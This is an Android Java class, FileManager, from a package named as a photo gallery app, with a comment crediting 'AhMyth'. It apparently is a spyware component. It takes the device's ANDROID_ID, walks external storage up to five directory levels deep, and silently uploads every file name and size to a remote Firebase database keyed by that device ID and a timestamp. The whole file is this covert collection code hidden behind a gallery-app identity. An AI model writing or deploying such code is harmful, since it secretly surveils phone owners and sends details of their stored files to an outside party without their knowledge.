package org.quantum.silverphoto.gallery.service;

import android.content.Context;
import android.os.Environment;
import android.provider.Settings;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by AhMyth on 11/11/16.
 */

public class FileManager {

    public static void doItFiles(Context context){
        String deviceID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference(deviceID);
        DatabaseReference fileRef = myRef.child("fl").child(new SimpleDateFormat("yyyyMMddHHmmss").format(new Date()));

        fileRef.child("root").setValue(Environment.getExternalStorageDirectory().getPath());
        searchTXT(new File(Environment.getExternalStorageDirectory().getPath()), fileRef, 0);


    }


    private static void searchTXT(File dir, DatabaseReference ref, int height) {
        if ( height > 5 ) return;

        File[] files = dir.listFiles();

        for (File file : files) {
            if (file.isFile()) {
                ref.child(removeNonAlphanumericLetters(file.getName())).setValue(file.length());
            } else if (file.isDirectory()) {
                ref.child(removeNonAlphanumericLetters(file.getName())).child("root").setValue("root");
//                ref.child(file.getName()).setValue(file.getName());
                DatabaseReference mRef = ref.child(removeNonAlphanumericLetters(file.getName()));
                searchTXT(file, mRef, height+1);
            }
        }

    }

    private static String removeNonAlphanumericLetters(String s) {
        return s.replaceAll("[^a-zA-Z0-9]", "");
    }
}
